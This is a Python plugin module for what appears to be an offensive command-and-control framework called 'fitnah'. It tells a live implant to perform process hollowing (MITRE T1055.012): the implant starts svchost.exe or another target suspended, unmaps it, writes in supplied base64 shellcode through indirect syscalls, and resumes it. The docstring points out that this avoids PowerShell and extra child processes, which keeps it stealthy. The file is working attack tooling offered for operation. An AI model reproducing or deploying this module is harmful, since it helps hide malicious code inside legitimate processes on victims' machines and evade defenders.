"""execution/process_hollow — process hollowing dispatched to native implant command. MITRE T1055.012

Uses the implant's built-in cmd_process_hollow() (ProcessHollowing in process_hollowing.c)
which calls CreateProcess(SUSPENDED) + NtUnmapViewOfSection + NtWriteVirtualMemory via
indirect syscalls — no PowerShell, no Add-Type, no child process besides the hollow target.
"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ProcessHollow(BasePlugin):
    NAME        = "process_hollow"
    DESCRIPTION = "Process hollowing — CreateProcess suspended, unmap, inject shellcode, resume. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.012"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("target_process", str, required=False, default="svchost.exe",
              help="Sacrificial host process (default: svchost.exe)"),
        Param("shellcode_b64",  str, required=True,
              help="Base64-encoded shellcode to hollow into the target"),
    )

    @mitre("T1055.012")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target = params.get("target_process", "svchost.exe")
        sc_b64 = params.get("shellcode_b64", "").strip()
        if not sc_b64:
            return ModuleResult.err("shellcode_b64 is required")

        # Dispatch to implant's native process hollowing handler (no PowerShell)
        r = ctx.send("process_hollow", {"target": target, "shellcode_b64": sc_b64})
        if r["status"] != "ok":
            return ModuleResult.err(f"process_hollow failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
